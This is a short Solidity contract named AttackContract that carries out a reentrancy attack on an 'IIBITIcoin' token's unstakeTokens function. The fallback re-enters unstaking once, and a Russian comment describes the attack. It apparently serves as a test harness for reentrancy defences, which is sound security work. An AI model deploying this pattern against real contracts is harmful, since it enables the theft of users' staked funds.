// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IIBITIcoin {
    function unstakeTokens() external;
}

contract AttackContract {
    IIBITIcoin public targetToken;
    bool public attacked;

    constructor(address _targetToken) {
        targetToken = IIBITIcoin(_targetToken);
    }

    // Функция атаки: пытается вызвать unstakeTokens повторно в fallback
    fallback() external {
        if (!attacked) {
            attacked = true;
            targetToken.unstakeTokens();
        }
    }

    function attackUnstake() external {
        targetToken.unstakeTokens();
    }
}
